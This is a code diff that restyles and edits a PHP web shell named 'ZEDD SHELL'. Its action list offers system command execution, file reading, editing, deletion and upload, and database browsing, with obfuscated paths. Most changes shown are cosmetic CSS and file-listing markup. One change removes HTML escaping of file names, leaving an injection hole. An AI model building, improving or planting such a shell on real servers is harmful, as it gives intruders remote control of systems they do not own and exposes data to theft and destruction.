@@ -1,12 +1,9 @@
-
-
 <?php
 session_start();
 $nami = explode(",", "");
 $safeMode = true;
 $actions = array("dasar","baca_file","phpinfo","sistem_kom","edit_file","download_file",'hapus_file','buat_file','buat_folder','reset_file' , 'hapus_folder','rename_file', 'kompres' , 'skl' , 'skl_d_t' , 'skl_d', 'upl_file');
 $awal = isset($_POST['awal']) && in_array($_POST['awal'],$actions) ? $_POST['awal'] : "dasar";
-
 
 
 function kunci($str)
@@ -388,135 +385,110 @@ else if($awal == 'upl_file' && isset($_FILES['ufile'])) {
 <title>ZEDD SHELL</title>
 <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <style>
-body
-{
-	background-color: #222222;
-	color: #D6D4D4;
-	font-family: Lucida,Verdana;
+body {
+	background-color: #333333; /* dark gray */
+	color: #E0E0E0;
+	font-family: Lucida, Verdana;
 	font-size: 12px;
 }
-.qalin
-{
+.qalin {
 	text-decoration: none;
-	color: #D6905E;
+	color: #2196F3; /* blue */
 	font-weight: 600;
 }
-.success
-{
+.success {
 	color: #9DB754;
 }
-.bad
-{
+.bad {
 	color: #B75654;
 }
-a
-{
-	color: #ACB754;
+a {
+	color: #2196F3;
 	text-decoration: none !important;
 }
-.fManager,.fManager tbody,.fManager tr
-{
+.fManager, .fManager tbody, .fManager tr {
 	padding: 0;
 	border-collapse: collapse;
 	margin: 0;
 	font-size: 12px;
 }
-.fManager
-{
+.fManager {
 	margin: 10px 0;
-}
-.fManager tbody tr:nth-child(2n+1)
-{
-	background: #331717;
-}
-.fManager tbody tr:nth-child(2n)
-{
-	background: #1C0C0C;
-}
-.fManager tbody tr:hover
-{
-	background: #000000;
-}
-.fManager thead th
-{
-	text-align: left;
-}
-.fManager thead tr
-{
-	background-color: #333333;
-}
-.fManager
-{
 	box-shadow: 1px 1px 1px 1px #333333;
 }
-.fManager thead th
-{
-	padding: 4px 3px;
+.fManager tbody tr:nth-child(2n+1) {
+	background: #383838;
 }
-.baca_file
-{
+.fManager tbody tr:nth-child(2n) {
+	background: #333333;
+}
+.fManager tbody tr:hover {
+	background: #2c2c2c;
+}
+.fManager thead tr {
+	background-color: #0d47a1; /* blue */
+}
+.fManager thead th {
+	text-align: left;
+	padding: 4px 3px;
+	color: #FFFFFF;
+	border: 1px solid #0d47a1;
+}
+.baca_file, .file_edit {
 	margin: 5px 0;
 	padding: 2px;
-	box-shadow: 1px 1px 1px 1px #333333;
-	background-color: #E1E1E1;
+	box-shadow: 1px 1px 1px 1px #000000;
+	background-color: #2b2b2b;
 	width: 100%;
 	height: 400px;
 	overflow: auto;
+	color: #FFFFFF;
 }
-.btn
-{
-	border: 1px solid #ACAE40;
-	background-color: #223B3B;
+.btn {
+	border: 1px solid #2196F3;
+	background-color: #1E88E5;
 	color: #E1E1E1;
 	padding: 1px 10px;
 	cursor: pointer;
 }
-.btn:disabled
-{
+.btn:disabled {
 	border: 1px solid #848484;
 	color: #848484;
 	cursor: not-allowed;
 }
-.file_edit
-{
-	margin: 5px 0;
-	padding: 2px;
-	box-shadow: 1px 1px 1px 1px #333333;
-	background-color: #E1E1E1;
-	width: 100%;
-	height: 400px;
-	overflow: auto;
-}
-input, select, textarea
-{
+input, select, textarea {
 	background: transparent !important;
-	color: #f6a56d;
-	border: 1px solid #D6905E;
+	color: #E1E1E1;
+	border: 1px solid #2196F3;
 	padding: 5px;
 }
-table td
-{
-	border: 1px solid rgba(214, 144, 94, 0.7);
+table td {
+	border: 1px solid #0d47a1;
 	min-width: 20px;
 	padding-left: 5px;
 	padding-right: 5px;
 	max-width: 500px;
-	color: #ffad6f;
-	background: #292929;
+	color: #FFFFFF;
+	background: #424242;
 }
-table th
-{
-	border: 1px solid #D6905E;
+table th {
+	border: 1px solid #0d47a1;
 	padding-left: 5px;
 	padding-right: 5px;
-	color: #ffad6f;
+	color: #FFFFFF;
 }
-table td div
-{
+table td div {
 	overflow: auto;
 	width: 100%;
 	height: 100%;
 	max-height: 100px;
+}
+.folderName {
+	color: #0d47a1;
+	font-weight: 600;
+}
+.fileName {
+	color: #FFFFFF;
 }
 </style>
 </head>
@@ -667,7 +639,7 @@ else if($awal == 'skl')
 
 						for (  $p = 1; $p <= $pages; $p++ )
 						{
-							print '<a style="'.($currentPage == $p ? 'background: #444;' : '').'margin-left: 2px; margin-bottom: 5px; padding: 2px 6px; border: 1px solid #ACB754; text-decoration: none;" href="javascript:halaman(\'?awal=skl&t=' . urlencode(urlencode(kunci($tableName))) . '&halaman=' . $p . '\');">' . $p . '</a> ';
+							print '<a style="'.($currentPage == $p ? 'background: #444;' : '').'margin-left: 2px; margin-bottom: 5px; padding: 2px 6px; border: 1px solid #2196F3; text-decoration: none;" href="javascript:halaman(\'?awal=skl&t=' . urlencode(urlencode(kunci($tableName))) . '&halaman=' . $p . '\');">' . $p . '</a> ';
 						}
 						print '<br><br>';
 
@@ -804,7 +776,11 @@ else
 				$element = substr($element,1);
 				$fileNamaLengkap = $default_dir . $pemisah . $element;
 				$pemisah = substr($default_dir,strlen($default_dir)-1)!="/" && substr($element,0,1)!="/" ? "/" : "";
-				$adi = is_dir($fileNamaLengkap) ? "[ $element ]" : $element;
+				if(is_dir($fileNamaLengkap)) {
+					$adi = "<span class='folderName'>[ $element ]</span>";
+				} else {
+					$adi = "<span class='fileName'>$element</span>";
+				}
 				$classN = "";
 				if(is_dir($fileNamaLengkap))
 				{
@@ -829,7 +805,7 @@ else
 					{
 						$url = "?berkas=".urlencode(urlencode(kunci($fileNamaLengkap)));
 					}
-					$classN = " style='font-weight: 600;'";
+					$classN = "";
 				}
 				else
 				{
@@ -839,7 +815,7 @@ else
 				$isReadableColor = is_readable( $fileNamaLengkap ) && is_writeable( $fileNamaLengkap );
 				print '<tr>
 						<td></td>
-						<td><a href="javascript:halaman(\''.$url.'\')"'.$classN.'>'.htmlspecialchars($adi).'</a></td>
+						<td><a href="javascript:halaman(\''.$url.'\')">'.$adi.'</a></td>
 						<td>' . ($fayldi?sizeFormat(filesize($fileNamaLengkap)):'') . '</td>
 						<td>' . (date('d M Y, H:i' , filectime($fileNamaLengkap))) . '</td>
 						<td>' . htmlspecialchars(fileowner($fileNamaLengkap)) . '</td>
@@ -847,15 +823,15 @@ else
 						<td>';
 						if( is_file($fileNamaLengkap) )
 						{
-							print (' <a href="javascript:halaman(\''.str_replace("baca_file","download_file",$url).'\')"'.$classN.'>Download</a> | ') .
-								(' <a href="javascript:changeFileName(\'' . htmlspecialchars($adi) . '\' , \''.str_replace("baca_file","rename_file",$url).'\');"'.$classN.'>Rename</a> | ') .
-								(' <a href="javascript:faylSifirla(\''.str_replace("baca_file","reset_file",$url).'\');"'.$classN.'>Kosong</a> | ') .
-								(' <a href="javascript:faylSil(\''.str_replace("baca_file","hapus_file",$url).'\')"'.$classN.'>Delete</a>');
+							print (' <a href="javascript:halaman(\''.str_replace("baca_file","download_file",$url).'\')">Download</a> | ') .
+								(' <a href="javascript:changeFileName(\'' . htmlspecialchars($element) . '\' , \''.str_replace("baca_file","rename_file",$url).'\');">Rename</a> | ') .
+								(' <a href="javascript:faylSifirla(\''.str_replace("baca_file","reset_file",$url).'\')">Kosong</a> | ') .
+								(' <a href="javascript:faylSil(\''.str_replace("baca_file","hapus_file",$url).'\')">Delete</a>');
 						}
 						else if( $adi != '[ . ]' && $adi != '[ .. ]' )
 						{
-							print (' <a href="javascript:kompres(\'' . urlencode(urlencode(kunci($fileNamaLengkap))) . '\')"'.$classN.'>Zip</a> | ') .
-								(' <a href="javascript:silPapka(\'' . urlencode(urlencode(kunci($fileNamaLengkap))) . '\')"'.$classN.'>Hapus</a>');
+							print (' <a href="javascript:kompres(\'' . urlencode(urlencode(kunci($fileNamaLengkap))) . '\')">Zip</a> | ') .
+								(' <a href="javascript:silPapka(\'' . urlencode(urlencode(kunci($fileNamaLengkap))) . '\')">Hapus</a>');
 						}
 						print '</td>
 					</tr>';
